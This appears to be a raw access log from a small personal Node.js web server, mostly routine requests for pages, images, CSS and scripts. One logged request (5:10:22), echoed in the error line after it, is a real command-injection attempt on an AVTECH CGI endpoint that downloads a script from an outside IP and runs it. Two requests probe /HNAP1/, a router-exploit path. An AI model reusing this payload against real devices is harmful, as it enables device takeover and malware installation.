[1:12:00] server is listening on 80
[1:12:11] /
[1:12:11] Sent:index.html
[1:12:11] /favicon.ico
[1:12:11] Sent:favicon.ico
[1:12:12] /
[1:12:12] Sent:index.html
[1:12:12] /favicon.ico
[1:12:12] Sent:favicon.ico
[1:12:12] /
[1:12:12] Sent:index.html
[1:12:12] /favicon.ico
[1:12:12] Sent:favicon.ico
[1:16:28] /
[1:16:28] Sent:index.html
[1:31:26] /
[1:31:26] Sent:index.html
[1:41:19] /
[1:41:19] Sent:index.html
[1:41:24] /rest/
[1:41:24] Sent:rest/index.html
[1:41:24] /rest/img/glad.png
[1:41:24] Sent:rest/img/glad.png
[1:41:54] /rest/img/hussik.png
[1:41:54] Sent:rest/img/hussik.png
[1:42:00] /rest/img/glad.png
[1:42:00] Sent:rest/img/glad.png
[1:42:02] /rest/img/hussik.png
[1:42:02] Sent:rest/img/hussik.png
[1:42:11] /rest/img/hussik.png
[1:42:11] Sent:rest/img/hussik.png
[1:42:21] /naeb/
[1:42:21] Sent:naeb/index.html
[1:42:21] /naeb/css/main.css
[1:42:21] /naeb/js/main.js
[1:42:21] Sent:naeb/css/main.css
[1:42:21] Sent:naeb/js/main.js
[3:45:22] /
[3:45:22] Sent:index.html
[3:48:38] server is listening on 80
[3:49:13] /
[3:49:13] Sent:index.html
[3:50:14] /
[3:50:14] Sent:index.html
[3:55:14] /
[3:55:14] Sent:index.html
[3:55:14] /favicon.ico
[3:55:14] Sent:favicon.ico
[3:56:40] /
[3:56:40] Sent:index.html
[3:59:08] server is listening on 80
[3:59:13] /
[3:59:13] Sent:index.html
[3:59:14] /favicon.ico
[3:59:14] Sent:favicon.ico
[4:08:54] /
[4:08:54] Sent:index.html
[4:08:55] /favicon.ico
[4:08:55] Sent:favicon.ico
[4:09:05] /
[4:09:05] Sent:index.html
[4:09:05] /favicon.ico
[4:09:05] Sent:favicon.ico
[4:09:06] /rest/
[4:09:06] Sent:rest/index.html
[4:09:06] /rest/img/glad.png
[4:09:06] Sent:rest/img/glad.png
[4:09:07] /rest/
[4:09:07] Sent:rest/index.html
[4:09:07] /rest/img/glad.png
[4:09:07] Sent:rest/img/glad.png
[4:09:08] /favicon.ico
[4:09:08] Sent:favicon.ico
[4:09:10] /naeb/
[4:09:10] Sent:naeb/index.html
[4:09:10] /naeb/css/main.css
[4:09:10] /naeb/js/main.js
[4:09:10] Sent:naeb/css/main.css
[4:09:10] Sent:naeb/js/main.js
[4:18:03] /
[4:18:03] Sent:index.html
[4:49:12] /
[4:49:12] Sent:index.html
[4:49:14] /
[4:49:14] Sent:index.html
[4:49:19] /
[4:49:19] Sent:index.html
[4:49:27] /
[4:49:27] Sent:index.html
[4:49:44] /
[4:49:44] Sent:index.html
[5:03:28] /
[5:03:28] Sent:index.html
[5:10:22] /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.33.119/avtechsh%20-O%20d4rk;%20chmod%20777%20d4rk;%20sh%20d4rk)&password=admin
[5:10:22] Error: ENOENT: no such file or directory, stat '/home/fybits/Projects/NodeJS/HTTPServer/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http:/209.141.33.119/avtechsh%20-O%20d4rk;%20chmod%20777%20d4rk;%20sh%20d4rk)&password=admin'
[5:37:51] /
[5:37:51] Sent:index.html
[6:43:31] /
[6:43:31] Sent:index.html
[6:58:46] /
[6:58:46] Sent:index.html
[6:58:46] /HNAP1/
[6:58:46] Error: ENOENT: no such file or directory, stat '/home/fybits/Projects/NodeJS/HTTPServer/HNAP1/index.html'
[8:13:12] /
[8:13:12] Sent:index.html
[8:25:57] /
[8:25:57] Sent:index.html
[8:25:57] /HNAP1/
[8:25:57] Error: ENOENT: no such file or directory, stat '/home/fybits/Projects/NodeJS/HTTPServer/HNAP1/index.html'
[8:28:08] /
[8:28:08] Sent:index.html
[9:34:45] /
[9:34:45] Sent:index.html
[9:34:46] /favicon.ico
[9:34:47] Sent:favicon.ico
[10:05:52] /
[10:05:52] /
[10:05:52] Sent:index.html
[10:05:52] Sent:index.html
[10:06:05] /
[10:06:05] Sent:index.html
[11:55:58] /
[11:55:58] Sent:index.html
[12:27:49] /
[12:27:49] Sent:index.html
[12:28:10] /
[12:28:10] Sent:index.html
[13:24:24] /
[13:24:24] Sent:index.html
[13:24:35] /rest/
[13:24:35] Sent:rest/index.html
[13:24:35] /rest/img/glad.png
[13:24:35] Sent:rest/img/glad.png
[13:24:41] /naeb/
[13:24:41] Sent:naeb/index.html
[13:24:41] /naeb/css/main.css
[13:24:41] Sent:naeb/css/main.css
[13:24:41] /naeb/js/main.js
[13:24:41] Sent:naeb/js/main.js
[13:28:46] server is listening on 80
[13:30:03] server is listening on 80
[13:30:09] /naeb/
[13:30:09] Sent:naeb/index.html
[13:30:09] /naeb/css/main.css
[13:30:09] Sent:naeb/css/main.css
[13:30:09] /naeb/js/main.js
[13:30:09] Sent:naeb/js/main.js
[13:30:17] /naeb/
[13:30:17] Sent:naeb/index.html
[13:30:17] /naeb/css/main.css
[13:30:17] Sent:naeb/css/main.css
[13:30:17] /naeb/js/main.js
[13:30:17] Sent:naeb/js/main.js
[13:35:16] server is listening on 80
[13:35:17] server is listening on 80
[13:35:58] /
[13:35:58] Sent:index.html
[13:38:39] /favicon.ico
[13:38:39] Sent:favicon.ico
[13:38:43] /favicon.ico
[13:38:43] Sent:favicon.ico
[13:39:31] /favicon.ico
[13:39:31] Sent:favicon.ico
[13:39:55] /naeb/
[13:39:55] Sent:naeb/index.html
[13:39:55] /naeb/css/main.css
[13:39:55] /naeb/js/main.js
[13:39:55] Sent:naeb/css/main.css
[13:39:55] Sent:naeb/js/main.js
[13:40:42] /naeb/
[13:40:42] Sent:naeb/index.html
[13:40:42] /naeb/css/main.css
[13:40:42] Sent:naeb/css/main.css
[13:40:42] /naeb/js/main.js
[13:40:42] Sent:naeb/js/main.js
[13:40:43] /favicon.ico
[13:40:43] Sent:favicon.ico
[13:45:05] server is listening on 80
[13:46:05] server is listening on 80
[13:46:10] /favicon.ico
[13:46:10] Sent:favicon.ico
[13:47:11] server is listening on 80
[13:47:14] server is listening on 80
[13:47:16] /favicon.ico
[13:47:16] Sent:favicon.ico
[13:51:24] server is listening on 80
[13:51:31] server is listening on 80
